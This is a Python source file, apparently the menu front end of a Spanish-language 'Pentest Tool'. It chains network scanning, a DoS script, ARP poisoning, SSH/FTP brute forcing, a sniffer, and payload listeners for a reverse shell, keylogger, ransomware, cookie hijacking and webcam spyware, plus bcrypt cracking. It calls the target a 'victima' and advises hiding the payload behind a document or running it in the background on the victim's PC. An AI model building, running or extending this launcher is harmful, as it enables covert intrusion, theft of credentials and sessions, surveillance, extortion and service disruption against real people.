############### Modulos de Estetica ######################
from termcolor import colored; 
from colorama import Fore, Style;
import jwt



############### Modulos de Funcionalidad ######################
import os, time, requests as req;




##############Modulos definidos por el usuario###############

#Configs
from configs import API_PORT, API_PROTOCOL, SECRET, API_HOST;


#Crypto
from Modules.Crypto.Hashing import CrackHash;


#Footprinting
from Modules.Footprinting.NetworkProperties import NetworkProperties 
from Modules.Footprinting.FastDetection import FastDetection 
from Modules.Footprinting.DetailedScan import DetailedScan
from Modules.Footprinting.VulnerabilityDetection import DetectVulnerabilities;
from Modules.Footprinting.FuzzingWeb import FuzzingDomain;
from Modules.Footprinting.DomaInfo import Whois;

#Exploits
from Modules.Vulnerabilidades_explotacion.envenamiento_arp import envenenar_arp
from Modules.Vulnerabilidades_explotacion.fuerza_bruta import ssh_attack, ftp_attack;


#Payloads
from Modules.Payloads.Attacker.ReverseShell import reverse_shell_atacante;
from Modules.Payloads.Attacker.KeyLogger import ListenVictimKeyLogger
from Modules.Payloads.Attacker.Ransomware import GenerateKey, SendKey;
from Modules.Payloads.Attacker.SessionHijacking import ReceiveCookies;
from Modules.Payloads.Attacker.Spyware import ReceiveVideo;



props = NetworkProperties();

global endpoint;
endpoint = f"{API_PROTOCOL}://{API_HOST}:{API_PORT}/api/"




def print_color(text, color="red"):
    print(colored(text, color));



def CrearEstadistica(token, maquina = 0, attempt = 0, loss = 0, toolId = 1):

    data = {
        "machine": maquina,
        "attempt": attempt,
        "loss": loss,
        "toolId": toolId
        
    };


    headers = {
        "x-access-token": token
    }


    try:

        response = req.post(endpoint + "/statistics", json=data,headers=headers);


        if(not response.status_code in [200, 201]):
            raise jwt.InvalidIssuerError()


    except Exception as e:
        print(f"Error! {response.status_code} {response.json()}")



def fijar_objetivo(objetivo):

    while True:
        try:
            objetivo = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ£ üÖ§   üÖû üÖë üÖô üÖî üÖ£ üÖò üÖ• üÖû : {Style.RESET_ALL}"))
        except Exception:
            print_color("No se pudo fijar un objetivo, error"); 
        else:

            if(objetivo >= 0 and objetivo <= len(attack)):
                print(f"{Fore.GREEN}Objetivo Fijado{Style.RESET_ALL}")
                return objetivo;


def confirmacion_objetivo():
    os.system("clear");
            
    print_color(f"1. üÖù üÖû  üÖ£ üÖî üÖù üÖñ üÖû   üÖû üÖë üÖô üÖî üÖ£ üÖò üÖ• üÖû   üÖü üÖî üÖ° üÖû  üÖ¢ üÖò  üÖõ üÖê  üÖò üÖü")
    print_color(f"2. üÖ£ üÖî üÖù üÖñ üÖû   üÖ§ üÖù    üÖû üÖë üÖô üÖî üÖ£ üÖò üÖ• üÖû   üÖü üÖî üÖù üÖì üÖò üÖî üÖù üÖ£ üÖî\n");
                        
    while True:
        try:
            confirmacion = int(input(f"{Fore.RED}üÖ£ üÖò üÖî üÖù üÖî üÖ¢   üÖ§ üÖù   üÖû üÖë üÖô üÖî üÖ£ üÖò üÖ• üÖû   üÖí üÖê üÖü üÖ£ üÖê üÖì üÖû ? : {Style.RESET_ALL}"))
        except Exception:
                    print_color("No se pudo continuar con el ataque"); 
        else:
            if(confirmacion >= 1 and confirmacion <= 2):
                return confirmacion;




def validar_ip_objetivo(confirmacion, objetivo):
    if(confirmacion == 1):
               
        while True:
            try:
                ip = input(f"{Fore.RED} Ingresa una IP : {Style.RESET_ALL}");
            except Exception:
                print_color("No se pudo continuar, ingresaste un contenido no valido"); 
                        
            if("." in ip):
                print(f"{Fore.GREEN}Ahora si, vamos a ver que se puede hacer{Style.RESET_ALL}")
                objetivo.update({"IP": ip})
                break;
                        
            
    elif(confirmacion == 2):
        if("IP" not in objetivo):
            print_color("No tienes un objetivo!!!"); 
            while True:
                try:
                    ip = input(f"{Fore.RED}Ingresa una IP : {Style.RESET_ALL}");
                except Exception:
                    print_color("No se pudo continuar, ingresaste un contenido no valido"); 
                        
                if("." in ip):
                    
                    print(f"{Fore.GREEN}Ahora si, vamos a ver que se puede hacer{Style.RESET_ALL}")
                    time.sleep(1)
                    
                    objetivo.update({"IP": ip})

                    break;
            
        print(f"{Fore.GREEN}Vamos a ver que se puede hacer{Style.RESET_ALL}")
                
            

#######################Cover##############################
opc = ""

while(True):
    os.system("clear")

    print_color("""
                

    __________               __                   __    ___________           .__   
    \______   \ ____   _____/  |_  ____   _______/  |_  \__    ___/___   ____ |  |  
    |     ___// __ \ /    \   __\/ __ \ /  ___/\   __\   |    | /  _ \ /  _ \|  |  
    |    |   \  ___/|   |  \  | \  ___/ \___ \  |  |     |    |(  <_> |  <_> )  |__
    |____|    \___  >___|  /__|  \___  >____  > |__|     |____| \____/ \____/|____/
                \/     \/          \/     \/                                     

    """)

    print_color("""
                ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°§‚†ê‚†¢‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°†‚†â‚†Ä‚†Ä‚†Ä‚†±‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Æ‚£ë‚†°‚°Ä‚°Ä‚†Ä‚¢Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£Ñ‚†à‚£å‚†™‚°Ñ‚¢∞‚¢°‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢ø‚£æ‚£Ä‚†à‚¢Ç‚†É‚°à‚†ò‚£Ñ‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ò‚£ø‚£∑‚£Ñ‚†§‚¢¢‚†Å‚°†‚†Ç‚†¢‚°Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚†è‚£∏‚°ø‚†ü‚£æ‚†ì‚†â‚°ñ‚†Ä‚†Ä‚†à‚¢Ç
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ü‚°è‚¢∏‚†ü‚†Ä‚£æ‚†Ä‚†à‚¢°‚°†‚†Ç‚†Ä‚†à
‚†±‚£¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°º‚°Ä‚°á‚¢à‚†ê‚††‚°ü‚†Ä‚†Ä‚¢û‚°ø‚¢Ö‚†Ñ‚¢Ä
‚†Ä‚†π‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚†ú‚†ä‚¢õ‚°É‚†ò‚†Ä‚†Ä‚°á‚†Ä‚°à‚†∂‚†Ñ‚†í‚†Ç‚°î
‚†Ä‚†Ä‚†ò‚£ø‚£ø‚£ø‚£∑‚£Ñ‚£Ä‚†Ä‚†§‚°†‚°§‚†í‚†´‚†±‚†Ä‚£º‚†ß‚†Ä‚†Ä‚†Ä‚¢Å‚††‚¢±‚†§‚†í‚†í‚£†‚†á
‚†Ä‚†Ä‚†Ä‚†ò‚¢ø‚£ø‚£ø‚£ø‚£æ‚°∑‚°ã‚£û‚†î‚°£‚†é‚†ô‚†Ç‚†ò‚†í‚†≤‚°ñ‚°í‚†í‚°∂‚¢ô‚†Ä‚†à‚†â‚£∏‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†ª‚£ø‚£ø‚°ø‚£ø‚£ø‚£Ø‚†™‚°ñ                ‚†§‚†§‚†î‚£Ä‚£§‚°É‚†Ä‚†Ä‚°Å‚†Ä‚£Ä‚†Ñ‚†ä‚°ú‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†õ‚¢ø‚°å‚†ô‚¢ø‚£æ‚°´‚†Ö‚†Ç‚†â‚†Ä‚†Ä‚†Å‚†™‚¢Å‚†à‚†â‚†Ä‚†Ä‚£∏‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ö‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
                """)
    
    
    
    
    
    try:
        token = input(f"{Fore.RED}Ingresa tu Token para iniciar: {Style.RESET_ALL}")

        token_decodificado = jwt.decode(token, SECRET, algorithms=["HS256"])

        print("El token es v√°lido")
        break

    except jwt.ExpiredSignatureError:
        print_color("El token ha expirado")
        time.sleep(2)

    except jwt.InvalidTokenError:
        print_color("El token es inv√°lido")
        time.sleep(2)

    except Exception as e:
        print_color(f"Error: {e}")
        print_color("Ingresa el token nuevamente")
        time.sleep(1)

        
        
        
##################################INICIO###############################################

menu_principal = ["""
                  

___________            __               .__        __  .__                
\_   _____/___   _____/  |______________|__| _____/  |_|__| ____    ____  
 |    __)/  _ \ /  _ \   __\____ \_  __ \  |/    \   __\  |/    \  / ___\ 
 |     \(  <_> |  <_> )  | |  |_> >  | \/  |   |  \  | |  |   |  \/ /_/  >
 \___  / \____/ \____/|__| |   __/|__|  |__|___|  /__| |__|___|  /\___  / 
     \/                    |__|                 \/             \//_____/  


                  """, 
                  """
                  

___________              .__         .__  __          
\_   _____/__  _________ |  |   ____ |__|/  |_  ______
 |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\/  ___/
 |        \>    < |  |_> >  |_(  <_> )  ||  |  \___ \ 
/_______  /__/\_ \|   __/|____/\____/|__||__| /____  >
        \/      \/|__|                             \/ 


                  
                  
                  """, 
                  """
                  

__________               .__                    .___      
\______   \_____  ___.__.|  |   _________     __| _/______
 |     ___/\__  \<   |  ||  |  /  _ \__  \   / __ |/  ___/
 |    |     / __ \\___  ||  |_(  <_> ) __ \_/ /_/ |\___ \ 
 |____|    (____  / ____||____/\____(____  /\____ /____  >
                \/\/                     \/      \/    \/ 


                  """,
 
                  """

                  
                  
_________                        __                                    .__           
\_   ___ \_______ ___.__._______/  |_  ____   ________________  ______ |  |__ ___.__.
/    \  \/\_  __ <   |  |\____ \   __\/  _ \ / ___\_  __ \__  \ \____ \|  |  <   |  |
\     \____|  | \/\___  ||  |_> >  | (  <_> ) /_/  >  | \// __ \|  |_> >   Y  \___  |
 \______  /|__|   / ____||   __/|__|  \____/\___  /|__|  (____  /   __/|___|  / ____|
        \/        \/     |__|              /_____/            \/|__|        \/\/     


  
    
                """
                  
]

opc = ""
i = 0
objetivo = {}; 





while i < len(menu_principal):
    os.system("clear")
    
    print_color(f"\n{menu_principal[i]}")
    print_color("1. Salir / Siguiente    2. Volver      3. Ingresar     4. Salir  ")

    while True:
        try:
            opc = int(input(f"{Fore.RED}Ingrese una opcion: {Style.RESET_ALL}"))
        except ValueError:
            print("Ingresa un t√©rmino correcto")
            break
        else:
            #Nos encargamos de que cuando los terminos introducidos sean correctos salgan del bucle
            if (1 <= opc or opc <= 4): 
                break
            



    #Controlamos las iteraciones de I segun la funcionalidad establecida
    if (opc == 1):
        i += 1
    elif (opc == 2):
        if i > 0:
            i -= 1
        
    elif (opc == 3):
        
        if(i == 0):
            os.system("clear")
            
            #Validamos la opcion ingresada por el usuario
            while(True):
                try:
                    os.system("clear")
                    print_color("1. Fast Detection")
                    print_color("2. Detailed Detection")
                    print_color("3. Vulnerabily Scanner")
                    print_color("4. Fuzzing Web")
                    print_color("5. Domain Info \n")

                    
                    user_option = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ§ üÖù üÖê   üÖû üÖü üÖí üÖò üÖû üÖù : {Style.RESET_ALL}"))

                    
                except Exception:
                    print_color("Dato ingrasado incorrecto");
                    time.sleep(1)
                    
                else:
                    if(user_option >= 1 and user_option <= 5):
                        break;
                
           
            if(user_option == 1):
                
                #Efectuar la fase de reconocimiento rapida:
                attack =  FastDetection(props.get("min_range"), props.get("netmaskCIDR"));
                os.system("clear"); 

                #Iteramos sobre el escaneo con el fin de hacer un reconocimiento de red 

                for i in range(len(attack)):
                    print_color(f"Informaci√≥n del Host:{i}")
                    for clave, valor in (attack[i].items()):
                        print_color(f"{clave}: {valor}")
                    print("\n")
                
                
                CrearEstadistica(token, toolId=1, attempt=1)
                
                #Fijamos un objetivo
                objetivo = fijar_objetivo(objetivo)   
                #Le pasamos el objetivo al diccionario objetivo 
                objetivo = attack[objetivo]
                
                print(objetivo)
                
                
            elif(user_option == 2):

                #Iniciamos un reconomiento detallado de la red, con ayuda de nmap

                attack = DetailedScan(props.get("min_range"), props.get("netmaskCIDR"))

                os.system("clear");
                

                for i in range(len(attack)):
                    print_color(f"Informaci√≥n del Host {i}:\n")
                    for clave, valor in attack[i].items():
                        print_color(f"{clave}: {valor}")
                    print("\n")

                CrearEstadistica(token, toolId=2,  attempt=1)
                #Fijamos un objetivo
                objetivo = fijar_objetivo(objetivo)                    
                #Guardamos el objeetivo en el diccionario 
                objetivo = attack[objetivo]; 
                
                
                
            elif(user_option == 3):
            
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo);
                
                CrearEstadistica(token, toolId=3, attempt=1)
    
                os.system("clear"); 
                            
                print_color("Espera a que la fase de reconocimiento detallado termine, esto puede tardar unos minutos...")
                print(objetivo);
                attack = DetectVulnerabilities(objetivo.get("IP"));

                print(attack)

                time.sleep(10)
                 
                if attack:
                    print_color("Informaci√≥n del Host:")
                    print_color(f"Estado de Host: {attack['Estado de Host']}")
                        
                    print_color("Puertos Abiertos:")
                    for puerto in attack["Puertos Abiertos"]:
                            print_color(f"Puerto: {puerto}")

                    print_color("Puertos y Versiones:")
                    for puerto_info in attack["Puertos y Versiones"]:
                            print_color(f"Puerto: {puerto_info['Puerto']}, Version: {puerto_info['Version']}")

                    print_color("Vulnerabilidades:")
                    for vulnerabilidad_info in attack["Vulnerabilidades"]:
                        print_color(f"Puerto: {vulnerabilidad_info['Puerto']}, Vulnerabilidad ID: {vulnerabilidad_info['Vulnerabilidad ID']}")

                        print("\n")


                    time.sleep(10);

                
                    
                else:
                    print_color("No se encontr√≥ informaci√≥n para el host.")
                    time.sleep(5);
                    
                      

            elif(user_option == 4):
                    
                CrearEstadistica(token, toolId=4, attempt=1)
                print_color("Deberas ingresar el dominio, ejemplo: https://example.com:");


                print_color("Ingresa tu Dominio aqui:");
                domain =  input(f"{Fore.RED} ==> : {Style.RESET_ALL}")

                os.system("clear")                    

                print_color("\nRecuerda que si quieres ingresar diccionarios personalizados puedes ir a resources!!:");


                try:
                    FuzzingDomain(domain);
                    print_color("\nGuarda estas rutas, seran de utilidad!");
                    
                    time.sleep(10); 
            
                except Exception as e:
                    print_color("Se ha lanzado un error, url incorrecta!");
                    time.sleep(4); 
            

            
            
            
            elif(user_option == 5):
                

                print_color("Deberas ingresar el dominio, ejemplo: https://example.com:");
                print_color("Ingresa tu Dominio aqui:");
                domain =  input(f"{Fore.RED} ==> : {Style.RESET_ALL}")

                os.system("clear")                    

                print_color("\nRecuerda que si quieres ingresar diccionarios personalizados puedes ir a resources!!");

                CrearEstadistica(token, toolId=5, attempt=1)

                try:
        
                    domainInfo = Whois(domain);

                    if(domainInfo.get("domain_name") == None): raise "Error, el dominio no existe!"

                    for key, value in domainInfo.items():
                        print(f"{Fore.GREEN}{key}:   {value}{Style.RESET_ALL}")

                    time.sleep(20); 
            
                except Exception as e:
                    print_color("Error al consultar el dominio!");
                    time.sleep(4); 
            
            
            
            
            
        elif(i == 1):
                
            confirmacion = confirmacion_objetivo();
            os.system("clear"); 
           
            validar_ip_objetivo(confirmacion, objetivo);
            
            print(objetivo)   

            os.system("clear")
        
            while(True):
                try:
                    os.system("clear")
                    print_color("1. üÖì üÖû üÖ¢   üÖê üÖ£ üÖ£ üÖê üÖí üÖö")
                    print_color("2. üÖî üÖù üÖ• üÖî üÖù üÖî üÖù üÖê üÖú üÖò üÖî üÖù üÖ£ üÖû     üÖê üÖ° üÖü")
                    print_color("3. üÖï üÖ§ üÖî üÖ° üÖ© üÖê   üÖë üÖ° üÖ§ üÖ£ üÖê")
                    print_color("4. üÖ¢ üÖù üÖò üÖï üÖï üÖî üÖ°\n")
                    
                    
                    user_option = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ§ üÖù üÖê   üÖû üÖü üÖí üÖò üÖû üÖù : {Style.RESET_ALL}"))
                    
                except Exception:
                    print_color("Dato ingrasado incorrecto");
                    time.sleep(1)
                    
                else:
                    if(user_option >= 1 and user_option <= 4):
                        break;
            
            
            
            if(user_option == 1):
                
                try:
                    
                    os.system(f"python3 Modules/Vulnerabilidades_explotacion/dos_attack.py {objetivo.get('IP')} {30}");
                      
                    CrearEstadistica(token, toolId=9, attempt=1)
                    
                except Exception as e:
                    print(f"Ha ocurrido un error {e}"); 
                                
                
            elif(user_option == 2):
            
                try:
                    while True:
                        envenenar_arp("wlan0", objetivo.get("IP"), props.get("gateway"))
                        envenenar_arp("wlan0", props.get("gateway"), objetivo.get("IP"))

                        CrearEstadistica(token, toolId=8, attempt=1)
                except KeyboardInterrupt:
                    print("Ataque Detenido")
                    time.sleep(2)                                    
               
            
            elif(user_option == 3):
                os.system("clear")
        
                while(True):
                    try:
                        os.system("clear")
                        print_color("1. Protocolo SSH (Puerto 22) (Secure Shell)")
                        print_color("2. Procolo FTP (Puerto 21) (Files Transfer Protocol)\n")
                        
                        
                        service = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ§ üÖù üÖê   üÖû üÖü üÖí üÖò üÖû üÖù : {Style.RESET_ALL}"))
                        
                    except Exception:
                        print_color("Dato ingrasado incorrecto");
                        time.sleep(1)
                        
                    else:
                        if(service >= 1 and service <= 2):
                            break;         
                
                
                if(service == 1):
                    
                    try:
                        username = input("Ingresa el nombre de usuario de la victima: ");
                        path_dicc = input("Ingresa la ruta del diccionario: ")

                    except:
                        print("No se ha podido completar el ataque de fuerza bruta")
                    
                    ssh_attack(objetivo.get('IP'), 22,username, path_dicc)
                    CrearEstadistica(token, toolId=7, maquina=1)

                    time.sleep(4)
                    
                    
                elif(service == 2):

                    try:
                        username = input("Ingresa el nombre de usuario de la victima: ");
                        path_dicc = input("Ingresa la ruta del diccionario: ")
                    except:
                        print("No se ha podido completar el ataque de fuerza bruta")
                    
                    ftp_attack(objetivo.get('IP'),username, path_dicc)
                    CrearEstadistica(token, toolId=7, maquina=1)

                    time.sleep(4)
                
                
            elif(user_option == 4):
                
                os.system("python3 ./Modules/Vulnerabilidades_explotacion/Sniffer.py")
                

            
        elif(i == 2):
            
            while (True):
                os.system("clear");
                try:
                    print_color("1. Reverse Shell");
                    print_color("2. KeyLogger");
                    print_color("3. Ransomware");
                    print_color("4. SessionHijacking");
                    print_color("5. Spyware");

                    user_option = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ§ üÖù üÖê   üÖû üÖü üÖí üÖò üÖû üÖù : {Style.RESET_ALL}"));
                
                except Exception:
                    print_color("Dato ingrasado incorrecto");
                    time.sleep(1);
                
                else:
                    if(user_option >= 1 and user_option <= 5):
                        break;
                    

            
            
            if(user_option == 1):

                #! Reverse shell                
                
                #Validamos si el usuario tiene un objetivo o no:
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo)
                
                os.system("clear")
                print_color("Antes de todo recuerda que debes haber cambiado la IP del Modulo del Payload de parte de la Victima,\npodrias intentar ponerlo detras de un documento o simplemente ejecutarlo desde su PC en segundo plano...")
                
                time.sleep(8);
                
                while True:
                    os.system("clear")
                    try:
                        puerto = int(input("Ingresa un puerto para la conexion: "))
                    except Exception:
                        print_color("Dato no valido")
                    else:
                        if(puerto > 0 and puerto <= 65535):
                            break;
                
                reverse_shell_atacante(objetivo.get("IP"), puerto); 
            
                CrearEstadistica(token, maquina=1, attempt=1, toolId=10)
            
            elif(user_option == 2):
                

                #! Key logger
                 #Validamos si el usuario tiene un objetivo o no:
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo)
        
                
                try: 
                    ListenVictimKeyLogger(objetivo.get("IP"))                
                    CrearEstadistica(token, maquina=1, attempt=1, toolId=11)

                except Exception as e: 
                    print_color(f"Ha sucedido un error! {e}");
                
                time.sleep(2)

                
            elif(user_option == 3):

                

                #! Ransowmware
                #Validamos si el usuario tiene un objetivo o no:
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo)
        
                
                if(not os.path.exists("./Resources/secret.key")):
                    GenerateKey()

                
                try: 
                    SendKey(objetivo.get("IP"));                

                    CrearEstadistica(token, maquina=1, attempt=1, toolId=12)
    
                except Exception as e:
                    print_color(f"Ha sucedido un error! {e}");
                

                time.sleep(2)


                    
                    
                    
            
            elif(user_option == 4):

                #Validamos si el usuario tiene un objetivo o no:
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo)
 
                try: 
                
                    ReceiveCookies(objetivo.get("IP"));
    
                    CrearEstadistica(token, maquina=1, attempt=1, toolId=13)
                except Exception as e:
                    print_color(f"Ha sucedido un error! {e}");
                
                time.sleep(2)



                
            elif(user_option == 5):
            
                #Validamos si el usuario tiene un objetivo o no:
                confirmacion = confirmacion_objetivo();
                validar_ip_objetivo(confirmacion, objetivo)
 
                try: 
                
                    ReceiveVideo(objetivo.get("IP"));                
                    CrearEstadistica(token, maquina=1, attempt=1, toolId=14)
    
                except Exception as e:
                    print_color(f"Ha sucedido un error! {e}");
                
                time.sleep(2)


        elif(i == 3):
            while (True):
                os.system("clear");
                try:
                    print_color("1. Crack Hash!");
                    user_option = int(input(f"{Fore.RED}üÖò üÖù üÖñ üÖ° üÖî üÖ¢ üÖê   üÖ§ üÖù üÖê   üÖû üÖü üÖí üÖò üÖû üÖù : {Style.RESET_ALL}"));
                    
                except Exception:
                    print_color("Dato ingrasado incorrecto");
                    time.sleep(1);
                    
                else:
                    if(user_option == 1):
                        break;
            
            try:

                hashedPassword = input(f"{Fore.RED}Ingresa tu hash Bcrypt: {Style.RESET_ALL}")

                CrackHash(hashedPassword, "./Resources/diccionario.txt")

                
                

                CrearEstadistica(token, maquina=1, attempt=1, toolId=7)

                time.sleep(3)

            except Exception as e:                 
                print_color(f"Ha ocurrido un error! {e}")
                time.sleep(3)

                 
            
    elif opc == 4:
        os.system("clear")
        print_color("Saliendo..")

        CrearEstadistica(token, loss=1)

        time.sleep(1)
        break;
    
    if(i > 3):
        i = 0;
    

